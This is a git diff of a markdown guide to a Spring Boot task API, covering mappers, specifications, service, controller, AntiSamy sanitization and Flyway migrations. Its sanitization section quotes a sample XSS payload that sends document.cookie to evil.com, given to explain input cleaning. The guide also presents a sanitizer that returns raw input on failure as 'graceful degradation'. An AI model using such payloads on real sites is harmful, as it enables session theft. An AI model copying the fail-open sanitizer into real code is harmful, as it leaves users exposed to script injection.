+    TE --> ENT
+    ENT --> TD
+    TD -- "header → title<br/>completionStatus =<br/>isCompleted ? DONE : PENDING" --> RES
+
+    style REQ fill:#4CAF50,color:#fff
+    style RES fill:#2196F3,color:#fff
+    style ENT fill:#FF9800,color:#fff
+    style TE fill:#9C27B0,color:#fff
+    style TD fill:#9C27B0,color:#fff
+```
+
+#### Field Mapping Matrix
+
+```mermaid
+graph TD
+    subgraph "toEntity: RequestDTO → Task"
+        T1["title"] -->|"@Mapping"| H1["header"]
+        D1["description"] -->|"auto"| D2["description"]
+        C1["completed"] -->|"auto"| C2["completed"]
+        X1["—"] -.->|"ignore"| ID1["id"]
+        X2["—"] -.->|"ignore"| DEL1["deleted"]
+        X3["—"] -.->|"ignore"| CA1["createdAt"]
+        X4["—"] -.->|"ignore"| LM1["lastModifiedAt"]
+        X5["—"] -.->|"ignore"| DA1["deletedAt"]
+    end
+
+    style T1 fill:#4CAF50,color:#fff
+    style H1 fill:#FF9800,color:#fff
+    style ID1 fill:#ccc,color:#666
+    style DEL1 fill:#ccc,color:#666
+    style CA1 fill:#ccc,color:#666
+    style LM1 fill:#ccc,color:#666
+    style DA1 fill:#ccc,color:#666
+```
 
 ```java
-@Mapper(componentModel = "spring")
+@Mapper(componentModel = "spring")  // Generates a Spring @Component at compile time
 public interface TaskMapper {
 
+    // Entity → DTO: header → title, plus a computed completionStatus
     @Mapping(source = "header", target = "title")
-    @Mapping(
-        target = "completionStatus",
-        expression = "java(task.isCompleted() ? \"DONE\" : \"PENDING\")"
-    )
+    @Mapping(target = "completionStatus",
+             expression = "java(task.isCompleted() ? \"DONE\" : \"PENDING\")")
     TaskResponseDTO toDTO(Task task);
 
+    // DTO → Entity: title → header, with server-managed fields ignored
     @Mapping(source = "title", target = "header")
     @Mapping(target = "id", ignore = true)
+    @Mapping(target = "deleted", ignore = true)
+    @Mapping(target = "createdAt", ignore = true)
+    @Mapping(target = "lastModifiedAt", ignore = true)
+    @Mapping(target = "deletedAt", ignore = true)
     Task toEntity(TaskRequestDTO dto);
 }
 ```
 
-**MapStruct** is a code generator. You write just the interface, and MapStruct generates the actual implementation class (`TaskMapperImpl`) at **compile time**. You never write manual mapping code like:
+### How Does MapStruct Work?
+
+MapStruct is a **compile-time code generator**. At build time, it reads this interface and generates `TaskMapperImpl.java`:
 
 ```java
-// You don't write this — MapStruct generates it:
-dto.setTitle(task.getHeader());
-dto.setCompletionStatus(task.isCompleted() ? "DONE" : "PENDING");
+// AUTO-GENERATED by MapStruct (simplified)
+@Component
+public class TaskMapperImpl implements TaskMapper {
+
+    @Override
+    public TaskResponseDTO toDTO(Task task) {
+        TaskResponseDTO dto = new TaskResponseDTO();
+        dto.setTitle(task.getHeader());              // source = "header" → target = "title"
+        dto.setDescription(task.getDescription());    // same name → auto-mapped
+        dto.setCompleted(task.isCompleted());          // same name → auto-mapped
+        dto.setCompletionStatus(task.isCompleted() ? "DONE" : "PENDING"); // expression
+        dto.setCreatedAt(task.getCreatedAt());
+        dto.setLastModifiedAt(task.getLastModifiedAt());
+        dto.setId(task.getId());
+        return dto;
+    }
+
+    @Override
+    public Task toEntity(TaskRequestDTO dto) {
+        Task task = new Task();
+        task.setHeader(dto.getTitle());               // source = "title" → target = "header"
+        task.setDescription(dto.getDescription());
+        task.setCompleted(dto.getCompleted());
+        // id, deleted, createdAt, lastModifiedAt, deletedAt are all ignored
+        return task;
+    }
+}
 ```
 
-**Mapping rules explained:**
+### Why MapStruct over Manual Mapping?
 
-| Annotation | Meaning |
-|---|---|
-| `@Mapping(source = "header", target = "title")` | When converting `Task → ResponseDTO`, take `task.header` and put it in `dto.title` |
-| `@Mapping(target = "completionStatus", expression = "java(...)")` | Compute `completionStatus` using a Java expression |
-| `@Mapping(source = "title", target = "header")` | When converting `RequestDTO → Task`, take `dto.title` and put it in `task.header` |
-| `@Mapping(target = "id", ignore = true)` | Never copy the ID from the request — the database generates it |
-| `componentModel = "spring"` | Make `TaskMapperImpl` a Spring bean, so it can be `@Autowired` |
+| Approach | Pros | Cons |
+|---|---|---|
+| Manual `new TaskResponseDTO(); dto.setTitle(...)` | Simple, obvious | Verbose, error-prone, tedious for many fields |
+| MapStruct | Type-safe, zero runtime reflection, compile-time errors for unmapped fields | Requires annotation processing setup |
+| ModelMapper / Dozer | Runtime reflection, no setup | Slow, errors only at runtime, hard to debug |
+
+### The `ignore = true` Pattern
+
+When converting `TaskRequestDTO → Task`, the entity has fields that the DTO doesn't:
+
+```
+TaskRequestDTO      →     Task
+──────────────             ────
+title              →     header     ✅ mapped via @Mapping
+description        →     description ✅ auto-mapped (same name)
+completed          →     completed   ✅ auto-mapped
+                         id          ❌ ignore (DB generates)
+                         deleted     ❌ ignore (defaults to false)
+                         createdAt   ❌ ignore (JPA auditing)
+                         lastModifiedAt ❌ ignore (JPA auditing)
+                         deletedAt   ❌ ignore (soft-delete SQL)
+```
+
+Without `ignore = true`, MapStruct generates a compile **warning** for each unmapped field. With `ignore = true`, the intent is explicit and the warning is suppressed.
 
 ---
 
-### 5.6 Service Layer — `TaskService.java`
-
-This is the **brain** of the application. All business logic lives here.
+## 7. Repository — `TaskRepository.java`
 
 ```java
-@Service
-@RequiredArgsConstructor
-public class TaskService {
-    private final TaskRepository taskRepository;
-    private final TaskMapper taskMapper;
-    private final SanitizationService sanitizationService;
-    // ...
+@Repository
+public interface TaskRepository extends JpaRepository<Task, Long>,
+                                        JpaSpecificationExecutor<Task> {
+    boolean existsByHeaderAndCompletedFalse(String header);
 }
 ```
 
-**All five operations:**
+### What You Get for Free
 
-#### GET all tasks
+By extending `JpaRepository<Task, Long>`, Spring Data JPA auto-generates:
+
+| Method | SQL Equivalent |
+|---|---|
+| `save(task)` | `INSERT INTO tasks (...) VALUES (...)` or `UPDATE tasks SET ... WHERE id = ?` |
+| `findById(id)` | `SELECT * FROM tasks WHERE id = ? AND deleted = false` |
+| `findAll(pageable)` | `SELECT * FROM tasks WHERE deleted = false LIMIT ? OFFSET ?` |
+| `delete(task)` | `UPDATE tasks SET deleted = true WHERE id = ?` (via `@SQLDelete`) |
+| `count()` | `SELECT COUNT(*) FROM tasks WHERE deleted = false` |
+
+### Derived Query Method
+
 ```java
-public List<TaskResponseDTO> getAllTasks() {
-    return taskRepository.findAll()  // DB: SELECT * FROM tasks
-            .stream()
-            .map(taskMapper::toDTO)  // Each Task → TaskResponseDTO
-            .toList();
+boolean existsByHeaderAndCompletedFalse(String header);
+```
+
+Spring Data parses this method name at startup:
+
+```
+existsBy    → SELECT COUNT(*) > 0 FROM tasks WHERE
+Header      → title = ?                  (header maps to "title" column)
+And         → AND
+Completed   → completed =
+False       → false
+```
+
+Result: `SELECT COUNT(*) > 0 FROM tasks WHERE title = ? AND completed = false AND deleted = false`
+
+(The `AND deleted = false` is automatically appended by `@SQLRestriction`.)
+
+### `JpaSpecificationExecutor`
+
+This interface adds `findAll(Specification<Task>, Pageable)` which enables **dynamic query building** at runtime. See [Section 8](#8-specifications--dynamic-filtering).
+
+---
+
+## 8. Specifications — Dynamic Filtering
+
+```java
+public class TaskSpecifications {
+
+    public static Specification<Task> hasTitle(String title) {
+        return (root, query, cb) ->
+            title == null ? null : cb.like(cb.lower(root.get("header")),
+                                          "%" + title.toLowerCase() + "%");
+    }
+
+    public static Specification<Task> isCompleted(Boolean completed) {
+        return (root, query, cb) ->
+            completed == null ? null : cb.equal(root.get("completed"), completed);
+    }
 }
 ```
-Stream pipeline: database list → Java stream → map each element → collect to list.
 
-#### GET one task
+### How Specifications Work
+
+A `Specification<Task>` is a lambda that produces a JPA `Predicate` (a WHERE clause fragment):
+
 ```java
-public TaskResponseDTO getTaskById(Long id) {
-    Task task = taskRepository.findById(id)
-            .orElseThrow(() -> new TaskNotFoundException(id));
-    return taskMapper.toDTO(task);
+(root, query, criteriaBuilder) -> predicate
+```
+
+| Parameter | What It Is |
+|---|---|
+| `root` | The `FROM tasks` table — used to access columns: `root.get("header")` |
+| `query` | The overall query — used for ordering, distinct, etc. |
+| `cb` (CriteriaBuilder) | Factory for building predicates: `cb.like(...)`, `cb.equal(...)` |
+
+### The `null` Return Convention
+
+Returning `null` from a `Specification` means **"no filter"**. Spring Data JPA ignores null predicates when combining with `Specification.where(...).and(...)`:
+
+```java
+// In TaskService.getAllTasks():
+Specification<Task> spec = Specification
+    .where(TaskSpecifications.hasTitle(title))      // null if title is null → ignored
+    .and(TaskSpecifications.isCompleted(completed)); // null if completed is null → ignored
+```
+
+| `title` | `completed` | Generated WHERE clause |
+|---|---|---|
+| `null` | `null` | `WHERE deleted = false` (no extra filters) |
+| `"milk"` | `null` | `WHERE deleted = false AND LOWER(title) LIKE '%milk%'` |
+| `null` | `true` | `WHERE deleted = false AND completed = true` |
+| `"milk"` | `false` | `WHERE deleted = false AND LOWER(title) LIKE '%milk%' AND completed = false` |
+
+---
+
+## 9. Service Layer — `TaskService.java`
+
+The service layer contains all business logic. It is the **only** layer that:
+- Orchestrates multiple repository calls
+- Applies business rules (duplicate checking, sanitization)
+- Manages transactions
+
+### Service Method Flow — `createTask()`
+
+```mermaid
+flowchart TD
+    START(["POST /api/tasks<br/>TaskRequestDTO"]) --> SANITIZE
+
+    SANITIZE["🛡️ sanitizeRequest()<br/>AntiSamy strips HTML/JS<br/>from title & description"]
+    SANITIZE --> DUP_CHECK
+
+    DUP_CHECK{"🔍 existsByHeaderAndCompletedFalse<br/>(sanitized title)?"}
+    DUP_CHECK -->|"true<br/>(duplicate exists)"| DUP_ERR["💥 throw DuplicateTaskException<br/>→ 409 Conflict"]
+    DUP_CHECK -->|"false<br/>(no duplicate)"| MAP_ENTITY
+
+    MAP_ENTITY["🔄 taskMapper.toEntity(dto)<br/>RequestDTO → Task entity<br/>(id = null)"]
+    MAP_ENTITY --> SAVE
+
+    SAVE["💾 taskRepository.save(entity)<br/>INSERT INTO tasks ...<br/>DB assigns id, createdAt"]
+    SAVE --> MAP_DTO
+
+    MAP_DTO["🔄 taskMapper.toDTO(savedTask)<br/>Task entity → ResponseDTO<br/>(+ completionStatus)"]
+    MAP_DTO --> DONE(["✅ Return TaskResponseDTO<br/>HTTP 200 OK"])
+
+    DUP_ERR --> GEH["GlobalExceptionHandler<br/>→ ErrorResponse JSON"]
+
+    style SANITIZE fill:#E8590C,color:#fff
+    style DUP_CHECK fill:#FFC107,color:#000
+    style MAP_ENTITY fill:#9C27B0,color:#fff
+    style SAVE fill:#336791,color:#fff
+    style MAP_DTO fill:#9C27B0,color:#fff
+    style DUP_ERR fill:#F44336,color:#fff
+    style DONE fill:#4CAF50,color:#fff
+```
+
+### All Service Methods — Overview
+
+```mermaid
+graph TB
+    subgraph "TaskService (Read Operations)"
+        GA["getAllTasks(title, completed, pageable)"]
+        GB["getTaskById(id)"]
+    end
+
+    subgraph "TaskService (Write Operations — @Transactional)"
+        CT["createTask(requestDto)"]
+        UT["updateTask(id, requestDto)"]
+        DT["deleteTask(id)"]
+    end
+
+    subgraph "Dependencies"
+        TR["TaskRepository"]
+        TM["TaskMapper"]
+        SS["SanitizationService"]
+        TS["TaskSpecifications"]
+    end
+
+    GA --> TS
+    GA --> TR
+    GA --> TM
+    GB --> TR
+    GB --> TM
+    CT --> SS
+    CT --> TR
+    CT --> TM
+    UT --> SS
+    UT --> TR
+    UT --> TM
+    DT --> TR
+
+    style GA fill:#2196F3,color:#fff
+    style GB fill:#2196F3,color:#fff
+    style CT fill:#4CAF50,color:#fff
+    style UT fill:#FF9800,color:#fff
+    style DT fill:#F44336,color:#fff
+```
+
+### Method Walkthrough
+
+#### `getAllTasks(String title, Boolean completed, Pageable pageable)`
+
+```java
+public Page<TaskResponseDTO> getAllTasks(String title, Boolean completed, Pageable pageable) {
+    // 1. Build a dynamic Specification from the optional filters
+    Specification<Task> spec = Specification.where(TaskSpecifications.hasTitle(title))
+            .and(TaskSpecifications.isCompleted(completed));
+
+    // 2. Execute the query with pagination + Specification
+    // 3. Map each Task entity → TaskResponseDTO via MapStruct
+    return taskRepository.findAll(spec, pageable)
+            .map(taskMapper::toDTO);  // method reference: same as task -> taskMapper.toDTO(task)
 }
 ```
-`findById` returns `Optional<Task>`. `orElseThrow` either unwraps it or throws a `TaskNotFoundException`, which is caught by the `GlobalExceptionHandler` and returns a 404 response.
 
-#### CREATE a task
+The `.map(taskMapper::toDTO)` call uses Spring Data's `Page.map()` method, which transforms each element in the page without affecting pagination metadata.
+
+#### `createTask(TaskRequestDTO requestDto)`
+
 ```java
 @Transactional
 public TaskResponseDTO createTask(TaskRequestDTO requestDto) {
-    sanitizeRequest(requestDto);  // Strip HTML/JS
+    // Step 1: Sanitize (strip XSS)
+    sanitizeRequest(requestDto);
 
+    // Step 2: Business rule — no duplicate active tasks with same title
     if (taskRepository.existsByHeaderAndCompletedFalse(requestDto.getTitle())) {
         throw new DuplicateTaskException("You already have an active task with this title!");
     }
+
+    // Step 3: DTO → Entity → Save → Entity → DTO
     Task taskEntity = taskMapper.toEntity(requestDto);
-    Task savedTask  = taskRepository.save(taskEntity);
+    Task savedTask = taskRepository.save(taskEntity);
     return taskMapper.toDTO(savedTask);
 }
 ```
-Step by step:
-1. **Sanitize**: Remove any dangerous HTML or JavaScript from the input.
-2. **Duplicate check**: Is there already an active (incomplete) task with the same title? If so, reject it with a 409 Conflict.
-3. **Map**: Convert `RequestDTO → Task` entity (id is null at this point).
-4. **Save**: `repository.save()` does `INSERT INTO tasks (...)` and returns the saved entity with the DB-generated id.
-5. **Map back**: Convert the saved `Task → ResponseDTO` (now includes the real id).
 
-#### UPDATE a task
+**Why `@Transactional`?** If the `save()` succeeds but some subsequent operation fails, the entire database change is rolled back. It guarantees atomicity.
+
+**Why sanitize before duplicate check?** Because `<script>Buy Groceries</script>` should be cleaned to `Buy Groceries` before checking if "Buy Groceries" already exists. If you checked first, the dirty title wouldn't match the clean one in the DB.
+
+#### `updateTask(Long id, TaskRequestDTO requestDto)`
+
 ```java
 @Transactional
 public TaskResponseDTO updateTask(Long id, TaskRequestDTO requestDto) {
@@ -450,6 +872,7 @@ public TaskResponseDTO updateTask(Long id, TaskRequestDTO requestDto) {
     Task existingTask = taskRepository.findById(id)
             .orElseThrow(() -> new TaskNotFoundException(id));
 
+    // Mutate the existing entity (JPA dirty checking detects changes automatically)
     existingTask.setHeader(requestDto.getTitle());
     existingTask.setDescription(requestDto.getDescription());
     existingTask.setCompleted(requestDto.getCompleted());
@@ -458,133 +881,192 @@ public TaskResponseDTO updateTask(Long id, TaskRequestDTO requestDto) {
     return taskMapper.toDTO(updatedTask);
 }
 ```
-For update, we fetch the existing entity from the database first (or throw 404), apply the new values from the request, and save it back.
 
-#### DELETE a task
+**Why mutate the existing entity instead of creating a new one?**
+- JPA tracks the existing entity. Mutating it triggers **dirty checking** — Hibernate only updates the changed columns.
+- The `@LastModifiedDate` auditing listener fires when the entity is modified.
+- Creating a new entity and saving it would be an INSERT (duplicate key error), not an UPDATE.
+
+#### `deleteTask(Long id)`
+
 ```java
 @Transactional
 public void deleteTask(Long id) {
     Task task = taskRepository.findById(id)
             .orElseThrow(() -> new TaskNotFoundException(id));
-    taskRepository.delete(task);
+    taskRepository.delete(task);  // Triggers @SQLDelete → soft delete
 }
 ```
 
-**What is `@Transactional`?**
-A transaction is a group of database operations that either ALL succeed or ALL fail together. If something throws an exception mid-way, Hibernate rolls back everything automatically. The `@Transactional` annotation tells Spring to wrap the method in a transaction.
+The `delete()` call doesn't execute `DELETE FROM tasks`. Thanks to `@SQLDelete`, it runs:
+```sql
+UPDATE tasks SET deleted = true, deleted_at = NOW() WHERE id = ?
+```
 
 ---
 
-### 5.7 Security Service — `SanitizationService.java`
-
-**Problem being solved:** XSS (Cross-Site Scripting).
-
-If a user sends: `"title": "<script>alert('Hacked!')</script>Buy groceries"` and you store it without sanitization, then any frontend that renders this text will execute the JavaScript — a security vulnerability.
-
-**How AntiSamy works:**
+## 10. Controller Layer — `TaskController.java`
 
 ```java
-CleanResults results = antiSamy.scan(input, policy);
-return results.getCleanHTML();
+@RestController                  // Every method returns JSON (no HTML views)
+@RequestMapping("/api/tasks")    // Base URL prefix
+@RequiredArgsConstructor         // Lombok: constructor injection
+public class TaskController {
+
+    private final TaskService taskService;
 ```
 
-AntiSamy uses a **policy file** (`antisamy-slashdot.xml`) that defines what HTML is "safe". The slashdot policy is the strictest — it allows almost no HTML, stripping all tags. This is perfect for a plain-text field like task title.
+### `@RequiredArgsConstructor` — Constructor Injection via Lombok
+
+Lombok generates:
+```java
+public TaskController(TaskService taskService) {
+    this.taskService = taskService;
+}
+```
+
+Spring sees this single constructor and automatically injects the `TaskService` bean. No `@Autowired` needed — **Spring Boot auto-detects single-constructor injection**.
+
+### Pagination with `@PageableDefault`
+
+```java
+@GetMapping
+public ResponseEntity<Page<TaskResponseDTO>> getAllTasks(
+        @RequestParam(required = false) String title,
+        @RequestParam(required = false) Boolean completed,
+        @PageableDefault(size = 10, sort = "header") Pageable pageable) {
+```
+
+| URL | Effect |
+|---|---|
+| `GET /api/tasks` | Page 0, size 10, sorted by header (default) |
+| `GET /api/tasks?page=2&size=5` | Page 2, size 5, sorted by header |
+| `GET /api/tasks?sort=completed,desc` | Sorted by completed descending |
+| `GET /api/tasks?title=buy&completed=false` | Filtered by title LIKE '%buy%' and completed=false |
+
+### Return Types: When to Use `ResponseEntity`
+
+| Method | Return Type | Why |
+|---|---|---|
+| `getAllTasks` | `ResponseEntity<Page<TaskResponseDTO>>` | Need to explicitly return `200 OK` with a Page |
+| `getTaskById` | `TaskResponseDTO` | Spring auto-wraps in `200 OK` |
+| `createTask` | `TaskResponseDTO` | Spring auto-wraps in `200 OK` |
+| `deleteTask` | `ResponseEntity<Void>` | Need to return `204 No Content` (no body) |
+
+---
+
+## 11. Input Sanitization — `SanitizationService.java`
+
+### The XSS Problem
+
+Without sanitization:
+```json
+POST /api/tasks
+{
+  "title": "<script>document.location='http://evil.com/steal?c='+document.cookie</script>Buy Groceries",
+  "completed": false
+}
+```
+
+This malicious script gets stored in the database. If any frontend renders it, the user's cookies are stolen.
+
+### The AntiSamy Solution
+
+AntiSamy uses a **policy file** (`antisamy-slashdot.xml`) that defines allowed HTML tags. The `slashdot` policy is the strictest — it strips essentially all HTML:
 
 ```
 Input:  "<script>alert('x')</script>Buy groceries"
 Output: "Buy groceries"
 
-Input:  "Buy groceries"     <- no dangerous content
-Output: "Buy groceries"     <- unchanged
+Input:  "Buy groceries"
+Output: "Buy groceries"  (unchanged — clean input passes through)
+
+Input:  null
+Output: null              (null/blank are returned as-is)
 ```
 
-The service is designed to be **fail-safe**:
-- If the policy file fails to load, it logs a warning but doesn't crash.
-- If sanitization itself fails, it logs an error and returns the original input.
-
----
-
-### 5.8 Controller Layer — `TaskController.java`
+### Graceful Degradation
 
 ```java
-@RestController
-@RequestMapping("/api/tasks")
-@RequiredArgsConstructor
-public class TaskController {
-    private final TaskService taskService;
-
-    @GetMapping
-    public List<TaskResponseDTO> getAllTasks() { ... }
-
-    @GetMapping("/{id}")
-    public TaskResponseDTO getTaskById(@PathVariable Long id) { ... }
-
-    @PostMapping
-    public TaskResponseDTO createTask(@Valid @RequestBody TaskRequestDTO requestDto) { ... }
-
-    @PutMapping("/{id}")
-    public TaskResponseDTO updateTask(@PathVariable Long id,
-                                      @Valid @RequestBody TaskRequestDTO requestDto) { ... }
-
-    @DeleteMapping("/{id}")
-    public ResponseEntity<Void> deleteTask(@PathVariable Long id) {
-        taskService.deleteTask(id);
-        return ResponseEntity.noContent().build(); // HTTP 204
+public String sanitize(String input) {
+    if (input == null || input.isBlank()) return input;     // Guard: null-safe
+    if (policy == null) { /* log warning */ return input; } // Guard: policy failed to load
+    try {
+        return antiSamy.scan(input, policy).getCleanHTML();
+    } catch (Exception e) {
+        /* log error */
+        return input;  // Better to store raw data than crash the request
     }
 }
 ```
 
-**Key annotations:**
-
-| Annotation | Meaning |
-|---|---|
-| `@RestController` | This class handles HTTP requests. Return values are automatically serialized to JSON. |
-| `@RequestMapping("/api/tasks")` | All endpoints in this class start with `/api/tasks`. |
-| `@GetMapping` | Handles `GET /api/tasks` |
-| `@GetMapping("/{id}")` | Handles `GET /api/tasks/5` — the `{id}` is a path variable. |
-| `@PostMapping` | Handles `POST /api/tasks` |
-| `@PutMapping("/{id}")` | Handles `PUT /api/tasks/5` |
-| `@DeleteMapping("/{id}")` | Handles `DELETE /api/tasks/5` |
-| `@PathVariable Long id` | Extracts `5` from `/api/tasks/5` and binds it to the `id` parameter. |
-| `@RequestBody TaskRequestDTO` | Deserializes the JSON request body into a `TaskRequestDTO` object. |
-| `@Valid` | Triggers Jakarta Bean Validation on the request body. If validation fails, throws `MethodArgumentNotValidException`. |
+The service never throws. If the sanitization engine itself fails (corrupted policy, unexpected input), it logs an error and returns the original input. This is a **graceful degradation** strategy — prefer availability over strictness.
 
 ---
 
-### 5.9 Exception Handling
+## 12. Exception Handling — Global Exception Handler
 
-Without exception handling, Spring Boot would return raw stack traces or generic error HTML pages. Instead, `GlobalExceptionHandler` intercepts all exceptions and returns structured JSON.
+### Exception Routing Flow
+
+```mermaid
+flowchart TD
+    REQ(["HTTP Request"]) --> CTRL["TaskController"]
+    CTRL --> SVC["TaskService"]
+    SVC --> REPO["TaskRepository"]
+
+    CTRL -->|"@Valid fails"| VAL_EX["MethodArgument<br/>NotValidException"]
+    SVC -->|"findById empty"| NF_EX["TaskNotFoundException"]
+    SVC -->|"duplicate title"| DUP_EX["DuplicateTaskException"]
+    SVC -->|"bad argument"| IAE_EX["IllegalArgumentException"]
+    REPO -->|"unexpected error"| GEN_EX["Exception<br/>(catch-all)"]
+
+    VAL_EX --> GEH["🎯 GlobalExceptionHandler<br/>@RestControllerAdvice"]
+    NF_EX --> GEH
+    DUP_EX --> GEH
+    IAE_EX --> GEH
+    GEN_EX --> GEH
+
+    GEH -->|"handleValidationErrors()"| R400["400 Bad Request<br/>+ field error map"]
+    GEH -->|"handleTaskNotFound()"| R404["404 Not Found"]
+    GEH -->|"handleDuplicateTask()"| R409["409 Conflict"]
+    GEH -->|"handleBadRequest()"| R400B["400 Bad Request"]
+    GEH -->|"handleGeneric()"| R500["500 Internal Server Error<br/>(generic message — NEVER<br/>expose ex.getMessage!)"]
+
+    R400 --> JSON["ErrorResponse JSON"]
+    R404 --> JSON
+    R409 --> JSON
+    R400B --> JSON
+    R500 --> JSON
+
+    style GEH fill:#9C27B0,color:#fff
+    style R400 fill:#FFC107,color:#000
+    style R404 fill:#FF9800,color:#fff
+    style R409 fill:#E91E63,color:#fff
+    style R500 fill:#F44336,color:#fff
+    style JSON fill:#607D8B,color:#fff
+```
 
 ```java
-@RestControllerAdvice
-public class GlobalExceptionHandler {
-    ...
-}
+@RestControllerAdvice  // = @ControllerAdvice + @ResponseBody
+public class GlobalExceptionHandler { ... }
 ```
 
-`@RestControllerAdvice` = `@ControllerAdvice` + `@ResponseBody`. It's a global interceptor for all controllers.
+`@RestControllerAdvice` is a global interceptor. When any controller throws an exception, Spring routes it here instead of returning a default whitelabel error page.
 
-**Exception → HTTP Status mapping:**
+### Exception → HTTP Status Mapping
 
-| Exception | HTTP Status | When thrown |
-|---|---|---|
-| `TaskNotFoundException` | 404 Not Found | Task with given ID doesn't exist |
-| `MethodArgumentNotValidException` | 400 Bad Request | @Valid fails (e.g., title is blank) |
-| `IllegalArgumentException` | 400 Bad Request | Invalid argument |
-| `DuplicateTaskException` | 409 Conflict | Active task with same title already exists |
-| `Exception` (catch-all) | 500 Internal Server Error | Any unexpected error |
+| Exception | Handler Method | HTTP Status | When |
+|---|---|---|---|
+| `TaskNotFoundException` | `handleTaskNotFound` | `404 Not Found` | `findById` returns empty |
+| `MethodArgumentNotValidException` | `handleValidationErrors` | `400 Bad Request` | `@Valid` fails |
+| `DuplicateTaskException` | `handleDuplicateTask` | `409 Conflict` | Same active title exists |
+| `IllegalArgumentException` | `handleBadRequest` | `400 Bad Request` | Invalid arguments |
+| `Exception` (catch-all) | `handleGeneric` | `500 Internal Server Error` | Anything else |
 
-**`ErrorResponse` structure:**
-```json
-{
-  "status": 404,
-  "error": "Not Found",
-  "message": "Task with ID 42 not found",
-  "timestamp": "2026-02-24T10:30:00"
-}
-```
+### Error Response Format
 
-For validation errors, the `errors` field is also populated:
+Every error returns a consistent JSON structure:
+
 ```json
 {
   "status": 400,
@@ -594,100 +1076,218 @@ For validation errors, the `errors` field is also populated:
     "title": "Title is required",
     "completed": "Completion status must be specified"
   },
-  "timestamp": "2026-02-24T10:30:00"
+  "timestamp": "2026-03-04T10:30:00"
 }
 ```
+
+The `errors` map is only present for validation failures. For other errors, only `status`, `error`, `message`, and `timestamp` are returned.
+
+### Why Never Expose Internal Details in 500 Errors
+
+```java
+@ExceptionHandler(Exception.class)
+public ResponseEntity<ErrorResponse> handleGeneric(Exception ex) {
+    ErrorResponse error = new ErrorResponse(
+        500, "Internal Server Error",
+        "Something went wrong. Please try again later."  // ← Generic message
+        // NEVER: ex.getMessage() — could contain SQL, stack traces, internal paths
+    );
+}
+```
+
+Exposing `ex.getMessage()` in a 500 response could leak:
+- Database table/column names
+- SQL query fragments
+- Internal class paths
+- Stack trace details
+
+Attackers use this information for reconnaissance.
 
 ---
 
-## 6. Configuration
+## 13. Configuration Classes
 
-### 6.1 `application.yaml` (main)
+### `JpaConfig.java`
 
-```yaml
-spring:
-  datasource:
-    url: jdbc:postgresql://localhost:5432/taskdb
-    username: docker
-    password: docker
-    driver-class-name: org.postgresql.Driver
-
-  jpa:
-    hibernate:
-      ddl-auto: update       # Hibernate auto-creates/updates tables to match entities
-    show-sql: false
-
-server:
-  port: 9090               # App runs on http://localhost:9090
-
-logging:
-  file:
-    name: logs/app.log     # Logs written to a file (auto-rotated)
-  level:
-    org.hibernate.SQL: DEBUG  # Shows SQL queries in logs
+```java
+@Configuration
+@EnableJpaAuditing  // Activates @CreatedDate / @LastModifiedDate processing
+public class JpaConfig { }
 ```
 
-**`ddl-auto: update`** — Hibernate compares your entities against the existing database schema and alters the schema to match. Good for development, but be careful in production (use `validate` or run proper migrations).
+Without `@EnableJpaAuditing`, the `@CreatedDate` and `@LastModifiedDate` annotations on `Task` would be silently ignored — timestamps would always be `null`.
 
-### 6.2 `application.yaml` (test)
+### `FlywayConfig.java`
 
-```yaml
-spring:
-  datasource:
-    url: jdbc:h2:mem:testdb;DB_CLOSE_DELAY=-1;DB_CLOSE_ON_EXIT=FALSE
-    driver-class-name: org.h2.Driver
+```java
+@Configuration
+public class FlywayConfig {
 
-  jpa:
-    hibernate:
-      ddl-auto: create-drop  # Create schema on start, drop on stop
-    properties:
-      hibernate:
-        dialect: org.hibernate.dialect.H2Dialect
-```
-
-Tests use **H2** (a pure-Java in-memory database) instead of PostgreSQL. This means:
-- No external PostgreSQL server needed to run tests.
-- Tests run faster.
-- `create-drop` ensures a fresh, clean database for every test run.
-
-### 6.3 `build.gradle.kts`
-
-Key dependencies:
-```kotlin
-implementation("org.springframework.boot:spring-boot-starter-web")           // REST API
-implementation("org.springframework.boot:spring-boot-starter-data-jpa")      // JPA/Hibernate
-implementation("org.springframework.boot:spring-boot-starter-validation")     // @Valid
-compileOnly("org.projectlombok:lombok")                                        // Boilerplate reduction
-annotationProcessor("org.projectlombok:lombok")
-implementation("org.mapstruct:mapstruct:1.6.0.Beta1")                         // Object mapping
-annotationProcessor("org.mapstruct:mapstruct-processor:1.6.0.Beta1")          // Code generation
-annotationProcessor("org.projectlombok:lombok-mapstruct-binding:0.2.0")       // Lombok + MapStruct compatibility
-implementation("org.owasp.antisamy:antisamy:1.7.4")                           // XSS protection
-runtimeOnly("org.postgresql:postgresql")                                        // PostgreSQL driver
-testRuntimeOnly("com.h2database:h2")                                           // H2 for tests
-```
-
-**JaCoCo configuration:**
-```kotlin
-plugins {
-    jacoco   // Adds code coverage capability
-}
-
-tasks.withType<Test> {
-    useJUnitPlatform()
-    finalizedBy(tasks.jacocoTestReport)  // Always generate report after tests
-}
-
-tasks.jacocoTestReport {
-    dependsOn(tasks.test)
-    reports {
-        xml.required.set(true)   // For CI/CD tools
-        html.required.set(true)  // For human browsing
+    @Bean(initMethod = "migrate")
+    public Flyway flyway(DataSource dataSource) {
+        return Flyway.configure()
+                .dataSource(dataSource)
+                .baselineOnMigrate(true)
+                .locations("classpath:db/migration")
+                .load();
     }
 }
 ```
 
-### 6.4 `docker-compose.yml`
+**Why explicit config instead of auto-configuration?** This gives explicit control over Flyway's behaviour, including `baselineOnMigrate(true)` which lets Flyway work even when added to an existing database with pre-existing tables.
+
+---
+
+## 14. Database Migrations — Flyway
+
+### Migration Evolution Timeline
+
+```mermaid
+graph LR
+    subgraph "V1 — init_schema"
+        V1["CREATE TABLE tasks<br/>─────────<br/>id BIGSERIAL PK<br/>title VARCHAR(100)<br/>description VARCHAR(500)<br/>completed BOOLEAN<br/>+ UNIQUE(title)"]
+    end
+
+    subgraph "V2 — add_soft_delete"
+        V2["ALTER TABLE tasks<br/>─────────<br/>+ deleted BOOLEAN<br/>+ INDEX idx_tasks_deleted"]
+    end
+
+    subgraph "V3 — Add_audit_fields"
+        V3["ALTER TABLE tasks<br/>─────────<br/>+ created_at TIMESTAMP<br/>+ last_modified_at TIMESTAMP<br/>+ deleted_at TIMESTAMP"]
+    end
+
+    V1 -->|"applied"| V2 -->|"applied"| V3
+
+    style V1 fill:#4CAF50,color:#fff
+    style V2 fill:#FF9800,color:#fff
+    style V3 fill:#2196F3,color:#fff
+```
+
+### How Flyway Runs on Application Startup
+
+```mermaid
+sequenceDiagram
+    participant App as Spring Boot App
+    participant FC as FlywayConfig
+    participant FW as Flyway
+    participant DB as PostgreSQL
+    participant HB as Hibernate/JPA
+
+    App->>FC: Bean initialization
